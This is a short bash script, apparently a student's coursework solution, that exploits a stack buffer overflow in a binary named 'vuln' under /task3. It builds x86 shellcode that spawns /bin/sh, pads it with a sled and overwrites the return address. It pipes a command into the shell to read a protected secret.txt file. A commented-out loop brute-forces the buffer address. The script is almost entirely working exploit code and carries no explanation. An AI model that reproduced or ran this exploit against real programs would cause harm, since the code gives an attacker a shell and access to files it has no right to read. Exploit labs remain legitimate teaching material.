#!/usr/bin/env bash

SHELLCODE=SHELLCODE='\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

NOP_SLED='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'

RETURN_ADDR='\xd0\xdd\xff\xff'

echo /bin/cat /task3/secret.txt | env -i \

/task3/s2095960/vuln "$(printf '\xd8\xdd\xff\xffaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')" 1237

#echo /bin/cat /task3/secret.txt | env -i sudo gdb -ex "run" --args /task3/s2095960/vuln $(echo -en "RETURN_ADDR$SHELLCODE")

: 'loop to bruteforce the address of buffer

address="ffffd290"

while true; do

	addr_string="\x${address:6:2}\x${address:4:2}\x${address:2:2}\x${address:0:2}"

	echo $address

	echo /bin/cat /task3/secret.txt | env -i /task3/s2095960/vuln $(echo -en "$addr_string$SHELLCODE") 1237

	address=$(printf "%08x" $(($(printf "0x%s" $address)+4)))

done'

	
